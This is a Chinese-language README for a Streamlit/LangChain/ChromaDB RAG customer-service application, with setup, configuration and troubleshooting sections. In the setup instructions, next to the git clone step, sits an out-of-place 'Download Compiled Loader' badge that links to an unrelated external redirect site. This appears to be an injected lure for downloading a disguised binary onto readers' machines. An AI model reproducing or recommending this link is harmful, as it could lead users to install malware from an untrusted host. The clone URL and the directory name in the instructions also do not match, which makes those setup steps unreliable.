RAG 智能客服系统 (RAG-based Intelligent Customer Service System)

https://img.shields.io/badge/Python-3.9+-blue.svg

https://img.shields.io/badge/Streamlit-1.28+-FF4B4B.svg

https://img.shields.io/badge/LangChain-0.1+-orange.svg

https://img.shields.io/badge/License-MIT-green.svg

一个基于 RAG (检索增强生成) 的本地化智能客服系统。支持通过 Web 界面上传知识文档，并基于文档内容进行智能问答。

✨ 核心特性

📁 文档上传与管理：支持 TXT 文件上传，自动去重、分块、向量化存储

🤖 智能问答：基于上传的文档内容，提供精准的上下文感知回答

💬 对话历史：完整保存用户对话历史，支持多轮对话

🔍 语义检索：使用 ChromaDB 向量数据库进行高效的语义相似度检索

🚀 流式响应：问答结果实时流式输出，提升用户体验

🖥️ 友好界面：基于 Streamlit 的简洁 Web 界面，无需前端开发经验

📁 项目结构
.
├── app_file_uploader.py      # 知识库上传 Web 界面

├── app_qa.py                 # 智能问答 Web 界面

├── config_data.py            # 配置文件（参数集中管理）

├── rag.py                    # RAG 问答服务核心逻辑

├── knowledge_base.py         # 知识库管理服务

├── vector_stores.py          # 向量存储服务

├── file_history_store.py     # 基于文件的对话历史存储

├── logger_config.py          # 日志配置模块

├── chroma_db/                # ChromaDB 向量数据库存储目录

├── chat_history/             # 对话历史存储目录

├── logs/                     # 系统日志目录

├── md5.text                  # 已处理文件 MD5 记录

└── requirements.txt          # Python 依赖列表

🚀 快速开始
1. 环境准备
bash
# 克隆项目

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

git clone https://github.com/jiayz-art/logal-rag.git
cd rag-customer-service

# 创建虚拟环境（推荐）
python -m venv venv
source venv/bin/activate  # Linux/Mac
# 或
venv\Scripts\activate  # Windows

# 安装依赖
pip install -r requirements.txt
2. 配置 API 密钥

在运行前，需要设置阿里云 DashScope（通义千问）API 密钥：

bash
# Linux/Mac
export DASHSCOPE_API_KEY="your-api-key-here"

# Windows (PowerShell)
$env:DASHSCOPE_API_KEY="your-api-key-here"

注：如果没有阿里云 API 密钥，请前往 阿里云 DashScope
申请。

3. 启动服务

本项目包含两个独立的 Streamlit 应用：

启动知识库上传服务（端口 8501）：

bash
streamlit run app_file_uploader.py

启动智能问答服务（端口 8501，如果 8501 被占用会自动使用 8502）：

bash
streamlit run app_qa.py
📖 使用指南
1. 上传知识文档

访问 http://localhost:8501（知识库上传服务）

点击"请上传TXT文件"按钮，选择您的知识文档

系统会自动处理文档：去重、分块、向量化存储

上传成功后，您会看到处理结果和生成的文本片段数量

2. 智能问答

访问 http://localhost:8501（智能问答服务）

在页面底部的输入框中输入您的问题

系统会从您上传的知识库中检索相关信息

基于检索到的内容和对话历史，AI 会给出流式回答

⚙️ 配置说明

所有配置参数都在 config_data.py文件中：

python
# 向量数据库配置
collection_name = "rag_demo"          # ChromaDB 集合名称
persist_directory = "./chroma_db"     # 向量数据库存储路径

# 文本分割配置
chunk_size = 1000                     # 文本块大小（字符数）
chunk_overlap = 100                   # 文本块重叠大小
max_split_char_number = 1000          # 触发分割的最小文本长度

# 检索配置
similarity_threshold = 1              # 检索返回的文档数量（k值）

# 模型配置
embedding_model_name = "text-embedding-v4"  # 嵌入模型
chat_model_name = "qwen3-max"               # 对话模型

# 文件路径
md5_path = "./md5.text"               # MD5 记录文件路径
🔧 核心模块说明
知识库管理 (knowledge_base.py)

文本文件上传与去重（基于 MD5）

智能文本分割（支持中英文）

向量化存储到 ChromaDB

元数据管理（文件名、时间、操作者）

RAG 问答服务 (rag.py)

语义检索与上下文构建

提示词工程与对话历史集成

大语言模型调用（通义千问）

流式输出处理

向量存储 (vector_stores.py)

ChromaDB 客户端封装

向量检索器配置

相似度搜索与结果返回

对话历史 (file_history_store.py)

基于文件的对话历史持久化

支持多会话隔离

JSON 格式存储

📊 技术栈

技术

	

用途

	

版本




Streamlit​

	

Web 应用框架

	

>=1.28




LangChain​

	

LLM 应用框架

	

最新版




ChromaDB​

	

向量数据库

	

最新版




DashScope​

	

阿里云大模型 API

	

最新版




Python​

	

后端语言

	

3.9+

🧪 示例
知识库上传
文件名：产品手册.txt
格式：text/plain | 大小：15.23 KB
状态：✓ 上传成功，生成 12 个文本片段
智能问答
用户：这个产品支持哪些支付方式？
AI：根据产品手册，我们的产品支持以下支付方式：
1. 支付宝
2. 微信支付
3. 银联在线支付
4. 信用卡支付
（流式输出，逐字显示）
🔍 高级功能
1. 多文档支持

支持多次上传不同文档，知识库自动合并

MD5 去重机制避免重复内容

2. 对话上下文

完整的对话历史记录

支持多轮对话，上下文感知

3. 可配置的检索

通过 similarity_threshold调整检索数量

可自定义文本分割策略

🐛 故障排除
常见问题

API 密钥错误

Error: Authentication failed

解决：确保已正确设置 DASHSCOPE_API_KEY环境变量

端口冲突

Port 8501 is already in use

解决：停止占用端口的进程，或修改 Streamlit 端口

bash
streamlit run app_qa.py --server.port 8502

文件编码错误

UnicodeDecodeError: 'utf-8' codec can't decode byte...

解决：确保上传的 TXT 文件使用 UTF-8 编码

内存不足

ChromaDB 写入失败

解决：减少单个文件大小，或增加系统内存

日志查看

系统日志保存在 logs/目录下：

app_YYYY-MM-DD.log- 应用运行日志

error_YYYY-MM-DD.log- 错误日志

📈 性能优化建议

文本分割优化

根据文档类型调整 chunk_size和 chunk_overlap

长文档建议使用较小的块大小（500-800）

检索优化

调整 similarity_threshold值平衡精度与召回率

考虑添加重排序（re-ranking）机制

缓存优化

对频繁查询的问题添加缓存

实现向量检索结果缓存

🤝 贡献指南

欢迎提交 Issue 和 Pull Request！

Fork 本仓库

创建功能分支 (git checkout -b feature/AmazingFeature)

提交更改 (git commit -m 'Add some AmazingFeature')

推送到分支 (git push origin feature/AmazingFeature)

开启 Pull Request

📄 许可证

本项目基于 MIT 许可证 - 查看 LICENSE
文件了解详情。

🙏 致谢

Streamlit
- 优秀的 Web 应用框架

LangChain
- LLM 应用开发框架

ChromaDB
- 开源向量数据库

DashScope
- 阿里云大模型 API

📞 支持与联系

如有问题或建议，请通过以下方式联系：

提交 GitHub Issue

邮箱：1968123554@qq.com

开始使用​ → 从 快速开始
部分开始您的 RAG 智能客服之旅！

​ star ⭐ 这个项目，如果您觉得它有帮助！
